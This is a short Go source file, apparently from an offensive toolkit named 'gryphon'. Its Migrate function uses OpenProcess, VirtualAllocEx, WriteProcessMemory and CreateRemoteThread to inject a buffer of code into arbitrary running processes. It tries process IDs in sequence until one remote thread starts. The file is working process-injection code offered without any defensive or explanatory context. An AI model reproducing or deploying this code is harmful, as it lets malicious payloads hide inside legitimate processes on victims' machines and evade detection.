package gryphon

import "github.com/whiterabb17/gryphon/variables"

func Migrate(Addr uintptr, Size int) {
	for i := 200; i < 99999; i++ {

		var F int = 0
		Proc, _, _ := variables.OpenProcess.Call(variables.PROCESS_CREATE_THREAD|variables.PROCESS_QUERY_INFORMATION|variables.PROCESS_VM_OPERATION|variables.PROCESS_VM_WRITE|variables.PROCESS_VM_READ, uintptr(F), uintptr(i))

		R_Addr, _, _ := variables.VirtualAllocEx.Call(Proc, uintptr(F), uintptr(Size), variables.MEM_RESERVE|variables.MEM_COMMIT, variables.PAGE_EXECUTE_READWRITE)

		variables.WriteProcessMemory.Call(Proc, R_Addr, Addr, uintptr(Size), uintptr(F))

		Status, _, _ := variables.CreateRemoteThread.Call(Proc, uintptr(F), 0, R_Addr, uintptr(F), 0, uintptr(F))
		if Status != 0 {
			break
		}
	}
}
